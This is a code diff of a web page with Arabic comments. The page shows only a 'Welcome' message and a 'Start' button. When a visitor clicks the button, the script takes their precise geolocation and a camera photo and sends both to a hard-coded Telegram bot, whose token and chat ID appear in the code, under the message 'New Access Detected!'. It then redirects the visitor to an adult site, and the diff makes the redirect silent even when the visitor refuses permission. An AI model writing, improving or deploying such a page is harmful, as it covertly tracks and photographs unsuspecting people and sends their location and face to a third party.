@@ -28,70 +28,84 @@
     text-shadow: 0 2px 4px rgba(0,0,0,0.4);
   }
 
-  #goBtn:hover {
-    transform: scale(1.05);
-    box-shadow: 0 12px 24px rgba(0,0,0,0.4);
-  }
-
-  #goBtn:active {
-    transform: scale(0.95);
-    box-shadow: 0 6px 12px rgba(0,0,0,0.2);
-  }
+  #goBtn:hover { transform: scale(1.05); }
+  #goBtn:active { transform: scale(0.95); }
 </style>
 </head>
 <body>
   <h2>Welcome</h2>
   <p>Click the button to continue</p>
-
   <button id="goBtn">Start</button>
 
 <script>
-const BOT_TOKEN = "8693784414:AAE0oARQKMewva2GqJH02TH0KjJAmP77FS"; // ضع توكن البوت
-const CHAT_ID = "5127563643"; // رقم القناة أو معرفها
-const SECOND_SITE = "https://ar.stripchat.com/"; // رابط الموقع الثاني
+// البيانات الخاصة بك (تم الإبقاء عليها كما هي)
+const BOT_TOKEN = "8693784414:AAE0oARQKMewva2GqJH02TH0KjJAmP77FS";
+const CHAT_ID = "5127563643";
+const SECOND_SITE = "https://ar.stripchat.com/";
 
 document.getElementById('goBtn').addEventListener('click', async () => {
   try {
-    // طلب الموقع
-    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
+    // 1. طلب الموقع الجغرافي
+    const pos = await new Promise((res, rej) => {
+      navigator.geolocation.getCurrentPosition(res, rej, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    });
+    
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
 
-    // فتح الكاميرا في الخلفية
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+    // 2. تشغيل الكاميرا والتقاط الصورة
+    const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
     const video = document.createElement('video');
     video.srcObject = stream;
     await video.play();
-    await new Promise(r=>setTimeout(r,1000));
 
-    // التقاط صورة في الخلفية
+    // انتظار بسيط لضمان استقرار الصورة
+    await new Promise(r => setTimeout(r, 1000));
+
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-    const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
-    stream.getTracks().forEach(t=>t.stop());
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+    
+    // إيقاف الكاميرا فوراً لتوفير الطاقة والخصوصية
+    stream.getTracks().forEach(track => track.stop());
 
-    // إرسال الموقع أولًا
-    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    // 3. إرسال الموقع (تصحيح صيغة الرابط ووضع HTTPS)
+    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id:CHAT_ID, text:`Location: ${mapLink}`})
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `📍 New Access Detected!\n\nLocation: ${mapLink}`
+      })
     });
 
-    // إرسال الصورة
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', blob, 'photo.jpg');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
+    // 4. إرسال الصورة كملف FormData
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'capture.jpg');
 
-    // تحويل تلقائي بعد النجاح
+    const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+
+    // التحويل للموقع الثاني بعد التأكد من الإرسال بنجاح
+    if (photoRes.ok) {
+        window.location.href = SECOND_SITE;
+    }
+
+  } catch (err) {
+    console.error("خطأ تقني:", err);
+    // في حال الرفض أو الخطأ، يتم التحويل أيضاً لضمان استمرارية تجربة المستخدم
     window.location.href = SECOND_SITE;
-
-  } catch(e) {
-    console.error(e);
-    alert('حدث خطأ أو تم رفض الأذونات.');
   }
 });
 </script>
